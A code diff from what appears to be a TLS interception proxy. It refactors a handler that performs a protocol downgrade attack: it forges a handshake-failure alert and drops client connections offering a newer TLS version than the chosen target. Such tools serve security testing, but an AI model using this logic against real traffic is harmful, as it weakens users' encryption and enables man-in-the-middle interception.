@@ -51,7 +51,7 @@ class AlterHandshake:
                     source_state = self.source_support[connection.source_ip]
                     logging.info("[%s] Current TLS version : %s Target TLS version : %s" % (connection.id, hello.version, self.tls_version))
 
-                    if hello.version > self.tls_version:
+                    if hello.version.value > self.tls_version.value:
                         # TODO : We should be doing the same thing, but with the server 
                         # (if it supports the target TLS version)
 
@@ -60,19 +60,20 @@ class AlterHandshake:
                                 self.source_support[connection.source_ip] = DowngradeSupportState.TESTING
                                 logging.warn("[%s] Attempting a downgrade attack for the source '%s'." % (connection.id, connection.source_ip))
 
-                            alert_message = TLSHeader()
-                            alert_message.content_type = TLSContentType.TLSAlert.value
-                            alert_message.version = self.tls_version
-                            alert_message.body = TLSAlert()
-                            alert_message.body.level = TLSAlertLevel.WARNING
-                            alert_message.body.description = TLSAlertDescription.HANDSHAKE_FAILURE
-                            alert_message.length = len(alert_message.body.encode(state, source))
+                            alert_message = TLSHeader (
+                                version = self.tls_version,
+                                body = TLSAlert (
+                                    level = TLSAlertLevel.WARNING,
+                                    description = TLSAlertDescription.HANDSHAKE_FAILURE
+                                )
+                            )
 
                             logging.warning("[%s] Sending TLS Fatal. %s" % (connection.id, str(alert_message.encode(state, source))))
                             self.proxy.send_packet(connection.id, source, alert_message.encode(state, source))
 
                             logging.warning("[%s] Dropping connection for downgrade." % (connection.id))
                             self.proxy.drop_connection(connection.id)
+
                             return TLSEmpty()
 
                         elif source_state == DowngradeSupportState.TESTING:
